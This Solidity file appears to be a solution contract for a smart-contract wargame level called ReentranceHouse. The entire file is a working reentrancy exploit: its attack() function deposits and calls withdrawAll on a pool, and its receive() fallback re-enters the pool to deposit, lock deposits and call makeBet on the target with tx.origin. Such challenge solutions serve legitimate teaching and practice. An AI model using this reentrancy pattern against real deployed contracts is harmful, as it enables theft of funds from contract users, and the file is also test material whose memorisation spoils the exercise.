// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../levels/ReentranceHouse.sol";

contract ReentranceHouseAttack {
    ReentranceHouse target;
    Pool pool;
    PoolToken depositToken;

    constructor(address payable target_) payable {
        target = ReentranceHouse(target_);
    }

    function setNeededParameters(
        address payable pool_,
        address depositToken_
    ) external {
        pool = Pool(pool_);
        depositToken = PoolToken(depositToken_);
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        // approve
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(tx.origin);
    }
}
